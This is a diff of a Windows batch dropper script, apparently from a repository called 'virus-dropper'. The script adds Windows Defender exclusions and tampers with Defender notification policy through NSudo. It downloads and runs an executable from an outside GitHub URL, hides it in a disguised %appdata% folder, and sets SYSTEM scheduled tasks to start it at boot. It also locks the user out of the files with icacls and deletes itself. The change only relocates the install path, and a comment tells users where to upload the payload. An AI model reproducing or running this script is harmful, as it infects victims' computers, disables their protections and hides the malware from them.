@@ -18,7 +18,7 @@ cls
 cls
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
 cls
-md "%systemroot%\System32\Windowsexe"
+md "%appdata%\Winmanager"
 cls
 
 ::upload files here: github.com - create account and create repository (public) then upload files
@@ -28,38 +28,38 @@ curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows.e
 cls
 
 
-move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
+move "%appdata%\Windows.exe" "%appdata%\Winmanager"
 cls
 
 
 
-powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%appdata%\Winmanager'"
 cls
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 cls
-start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
+start "Windows.exe" "%appdata%\Winmanager\Windows.exe"
 cls
-move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
+move "AV.bat" "%appdata%\Winmanager\AV.bat"
 cls
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
 cls
-SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
-SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
+SCHTASKS /CREATE /F /SC ONSTART /TR "%appdata%\Winmanager\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
+SCHTASKS /CREATE /F /SC ONSTART /TR "%appdata%\Winmanager\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
 cls
 del /f NSudo.exe
 cls
 timeout /t 2 /nobreak
-icacls  "%systemroot%\System32\Windowsexe\Windows.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
+icacls  "%appdata%\Winmanager\Windows.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 cls
-icacls  "%systemroot%\System32\Windowsexe\AV.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
+icacls  "%appdata%\Winmanager\AV.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 cls
-icacls "%systemroot%\System32\Windowsexe\AV.bat" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
+icacls "%appdata%\Winmanager\AV.bat" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
 cls
-icacls "%systemroot%\System32\Windowsexe\Windows.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
+icacls "%appdata%\Winmanager\Windows.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
 cls
-icacls "%systemroot%\System32\Windowsexe\AV.bat" /deny everyone:R "%username%":R
+icacls "%appdata%\Winmanager\AV.bat" /deny everyone:R "%username%":R
 cls
-icacls "%systemroot%\System32\Windowsexe\Windows.exe" /deny everyone:R "%username%":R
+icacls "%appdata%\Winmanager\Windows.exe" /deny everyone:R "%username%":R
 cls
 call :deleteSelf&exit
 :deleteSelf
